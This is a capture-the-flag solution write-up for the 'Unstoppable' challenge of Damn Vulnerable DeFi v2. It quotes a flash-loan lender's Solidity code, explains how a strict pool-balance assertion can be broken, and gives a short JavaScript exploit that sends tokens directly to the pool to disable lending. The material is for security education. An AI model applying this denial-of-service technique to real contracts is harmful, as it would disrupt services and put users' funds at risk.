![](cover.png)

# Damn Vulnerable DeFi solutions (v2)

Challenges created by [@tinchoabbate](https://twitter.com/tinchoabbate) at [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/)

## #1 - Unstoppable

The goal of this challenge is to disable flash loan lender contract. Some kind of DoS attack.

Vulnerability is inside **flashLoan()** function.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);

  damnValuableToken.transfer(msg.sender, borrowAmount);

  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

In order to disable contract from offering flash loans, we need to break one of safety checks inside the function.

Particiullary interesting line:

```solidity
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

The contract is making sure that contract balance of DVT token (`balanceBefore`) is matching the inner contract logic balance that is updated when user deposits token using `depositTokens` function (`poolBalance`).

We can exploit this by transferring DVT tokens to contract with ERC20 `transfer` function.

Solution code:

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
```

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.
